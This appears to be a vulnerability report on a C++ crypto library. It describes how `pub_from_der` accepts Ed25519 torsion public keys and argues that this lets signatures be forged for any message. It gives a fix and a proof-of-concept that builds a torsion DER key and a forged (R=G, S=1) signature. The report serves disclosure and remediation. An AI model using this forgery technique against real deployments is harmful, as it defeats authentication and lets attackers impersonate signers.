The existing test `RejectTorsionAndFixInfinityEq` in `tests/unit/crypto/test_eddsa.cpp` explicitly confirms that `from_bin` **succeeds** for the order-2 torsion point, `is_in_subgroup` returns false, and `curve.check()` returns error — but `pub_from_der` never calls `curve.check()`.

`ecurve_ed_t::verify` passes the raw serialized point directly to `ED25519_verify` with no intervening subgroup check.

OpenSSL's `ED25519_verify` uses the cofactor form `[8][S]B = [8]R + [8][k]A`. For any torsion public key A of order dividing 8 (e.g., the order-2 point), `[8][k]A = infinity` for all k, reducing the check to `[8][S]B = [8]R`. This is independent of the message M and the hash k, so an attacker can forge a valid signature `(R=[S]B, S)` for **any** message with only ~1 attempt.

### Title
Ed25519 `pub_from_der` accepts torsion public keys, enabling signature forgery via `verify` — (`src/cbmpc/crypto/base_eddsa.cpp`)

### Summary
`ecurve_ed_t::pub_from_der` calls `from_bin` without a subsequent subgroup check, allowing a DER-encoded torsion point to be loaded as a valid `ecc_pub_key_t`. `ecurve_ed_t::verify` then passes this torsion key directly to OpenSSL's `ED25519_verify`, which uses cofactor multiplication and therefore accepts forged signatures for any message.

### Finding Description
`ecurve_ed_t::pub_from_der` [1](#0-0)  validates only the DER prefix and then delegates to `from_bin`, which in turn calls `ec25519_core::from_bin` [2](#0-1)  — a function that only checks whether the encoded bytes satisfy the curve equation (valid x,y), but performs no subgroup membership check. The `is_in_subgroup` function [3](#0-2)  and `ecurve_t::check` exist and correctly reject torsion points, but neither is called anywhere in the `pub_from_der` → `from_bin` path.

`ecurve_ed_t::verify` [4](#0-3)  serializes the stored point back to 32 bytes and passes it directly to `ED25519_verify` with no subgroup check. OpenSSL's `ED25519_verify` uses the cofactor verification equation `[8][S]B = [8]R + [8][k]A`. For any torsion public key A whose order divides 8 (Ed25519's cofactor), `[8][k]A = infinity` for all scalars k, collapsing the check to `[8][S]B = [8]R`, which is independent of the message M and the Fiat-Shamir hash k.

The existing test suite confirms the precondition: `from_bin` returns `SUCCESS` for the order-2 torsion point `(x=0, y=p-1)`, `is_in_subgroup` returns `false`, and `curve.check` returns an error — yet `pub_from_der` never invokes either guard. [5](#0-4) 

### Impact Explanation
An attacker who controls a DER-encoded Ed25519 public key blob can supply a torsion point. After `from_der` succeeds, the attacker can forge a valid EdDSA signature `(R, S)` for **any** message M by choosing any scalar S and setting R = [S]B. The verification equation `[8][S]B = [8]R` holds trivially. Any honest caller that uses `from_der` followed by `verify` to authenticate peer messages will accept the forged signature. This maps to the **High** impact category: attacker-controlled blobs are accepted under the wrong key, and the verification layer produces an accepted invalid cryptographic output.

### Likelihood Explanation
The attack requires only the ability to supply a DER-encoded public key blob — a standard API input. No threshold collusion, no memory access, and no brute force is needed. The forged signature is constructible deterministically in O(1) scalar multiplications. Any caller that imports an Ed25519 public key from an untrusted source via `from_der` and then calls `verify` is directly exposed.

### Recommendation
Add a subgroup check inside `ecurve_ed_t::pub_from_der` immediately after `from_bin` succeeds:

```cpp
error_t ecurve_ed_t::pub_from_der(ecc_pub_key_t& P, mem_t der) const {
  if (der.size != ed25519::x509_prefix.size + ed25519::pub_compressed_bin_size())
    return coinbase::error(E_FORMAT);
  if (0 != memcmp(ed25519::x509_prefix.data, der.data, ed25519::x509_prefix.size))
    return coinbase::error(E_FORMAT);
  error_t rv = from_bin(P, der.skip(ed25519::x509_prefix.size));
  if (rv) return rv;
  if (!is_in_subgroup(P)) return coinbase::error(E_CRYPTO);  // <-- add this
  return SUCCESS;
}
```

Alternatively (or additionally), add the same guard at the top of `ecurve_ed_t::verify` to enforce a defense-in-depth invariant. The `ecurve_t::check` helper already encapsulates both the on-curve and subgroup checks and is the idiomatic guard used elsewhere in the codebase (e.g., `attach_private_scalar` at [6](#0-5) ).

### Proof of Concept

```cpp
// Build a DER blob for the Ed25519 order-2 torsion point (x=0, y=p-1).
// Compressed encoding: y = 2^255 - 19 - 1 = 2^255 - 20, sign bit = 0.
uint8_t torsion_bin[32];
torsion_bin[0] = 0xec;
for (int i = 1; i < 31; i++) torsion_bin[i] = 0xff;
torsion_bin[31] = 0x7f;

// Prepend the X.509 DER prefix for Ed25519 public keys.
buf_t der(ed25519::x509_prefix.size + 32);
memcpy(der.data(), ed25519::x509_prefix.data, ed25519::x509_prefix.size);
memcpy(der.data() + ed25519::x509_prefix.size, torsion_bin, 32);

// Step 1: from_der succeeds (no subgroup check).
ecc_pub_key_t pub_key;
assert(pub_key.from_der(der) == SUCCESS);  // passes today

// Step 2: Forge a signature for any message.
// Choose S=1, R=G. Then [8][1]G = [8]G = [8]R trivially.
// Construct (R, S) in Ed25519 wire format (64 bytes: R_compressed || S_le).
buf_t forged_sig(64);
// R = compressed encoding of the generator G
memcpy(forged_sig.data(), generator_compressed_32_bytes, 32);
// S = 1 in little-endian
memset(forged_sig.data() + 32, 0, 32);
forged_sig[32] = 0x01;

buf_t any_message = buf_t("hello world");
// Step 3: verify accepts the forged signature.
assert(pub_key.verify(any_message, forged_sig) == SUCCESS);  // forgery succeeds
```

```cpp
static error_t from_bin(point_t& R, mem_t bin) {
  if (bin.size != 32) return coinbase::error(E_FORMAT);

  buf_t buf = bin.rev();
  uint8_t neg = buf[0] >> 7;
  buf[0] &= 0x7f;
  fe_t y = fe_t::to_fe(uint256_t::from_bin(buf));

  // x² = (y² - 1) / (dy² + 1)

  fe_t u, v, w, vxx, check;

  u = y * y;
  v = u * formula_t::get_d();
  u -= fe_t::one();       // u = y^2-1
  v += fe_t::one();       // v = dy^2+1
  w = u * v;              // w = u*v
  fe_t x = w.pow22523();  // x = w^((q-5)/8)
  x *= u;                 // x = u * w^((q-5)/8)

  vxx = x * x;
  vxx *= v;
  check = vxx - u;  // vx^2-u
  if (!check.is_zero()) {
    check = vxx + u;  // vx^2+u
    if (!check.is_zero()) {
      return coinbase::error(E_CRYPTO);
    }
    static const fe_t sqrtm1 =
        fe_t::from_bn(bn_t::from_hex("2b8324804fc1df0b2b4d00993dfbd7a72f431806ad2fe478c4ee1b274a0ea0b0"));
    x *= sqrtm1;
  }

  uint256_t x_val = x.from_fe();
  if (neg != (x_val.w0 & 1)) x = -x;

  R.x = x;
  R.y = y;
  R.z = fe_t::one();
  return 0;
```

```cpp
TEST(CryptoEdDSA, RejectTorsionAndFixInfinityEq) {
  crypto::vartime_scope_t vartime_scope;
  ecurve_t curve = crypto::curve_ed25519;

  // Compressed encoding of the Ed25519 order-2 point (x=0, y=-1):
  // y = p-1 = 2^255-20, sign bit = 0.
  uint8_t order2[32];
  order2[0] = 0xec;
  for (int i = 1; i < 31; i++) order2[i] = 0xff;
  order2[31] = 0x7f;

  ecc_point_t P(curve);
  EXPECT_EQ(P.from_bin(curve, mem_t(order2, 32)), SUCCESS);
  EXPECT_TRUE(P.is_on_curve());
  EXPECT_FALSE(P.is_infinity());
  EXPECT_FALSE(P.is_in_subgroup());
  EXPECT_NE(curve.check(P), SUCCESS);

  // Sanity: infinity should not compare equal to the generator.
  const ecc_point_t G = curve.generator();
  const ecc_point_t I = curve.infinity();
  EXPECT_FALSE(G == I);
  EXPECT_TRUE(I.is_infinity());
}
```
